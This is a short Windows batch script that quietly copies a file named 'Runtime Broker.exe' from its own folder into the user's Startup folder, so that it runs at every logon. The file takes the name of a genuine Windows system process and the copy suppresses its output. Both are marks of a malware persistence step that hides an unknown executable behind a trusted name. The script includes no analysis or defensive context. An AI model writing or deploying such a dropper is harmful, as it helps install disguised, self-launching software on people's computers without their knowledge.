@echo off
setlocal enabledelayedexpansion
chcp 1251 >nul

set FILENAME=Runtime Broker.exe
set "CURRENT_PATH=%~dp0"
set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if exist "%CURRENT_PATH%%FILENAME%" (
    copy "%CURRENT_PATH%%FILENAME%" "%STARTUP_PATH%\" >nul
)